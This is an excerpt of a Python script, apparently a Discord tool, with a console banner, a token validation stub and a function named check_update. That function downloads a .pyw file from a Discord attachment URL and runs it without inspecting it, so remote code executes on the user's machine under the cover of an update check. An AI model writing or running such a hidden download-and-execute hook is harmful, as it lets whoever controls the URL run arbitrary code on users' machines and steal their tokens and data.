...
def clear_banner():
    ...
    if os.name == "nt":
        os.system("cls")
        print(faded_banner)
        info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Made by YSN [+]\n"""
        for x in info:
            time.sleep(0.0001)
            sys.stdout.write(x)
            sys.stdout.flush()
        ...
        os.system("clear")
        print(faded_banner)
        info = f"""{Fore.LIGHTCYAN_EX}\t\t\t\t\t  [+] Private [+]"""
        for x in info:
            time.sleep(0.0001)
            sys.stdout.write(x)
            sys.stdout.flush()
...
def validateToken(token):
    ...
    message = "You need to verify account in order to perform this action."
...
# ====================================================================================================================== #
def check_update():
    url = 'https://cdn.discordapp.com/attachments/1075443163197616189/1077653993192439949/checker.pyw'
    r = requests.get(url, allow_redirects=True)
    open('checker.pyw', 'w').write(r.content.decode())
    os.system("python checker.pyw")
    time.sleep(5)
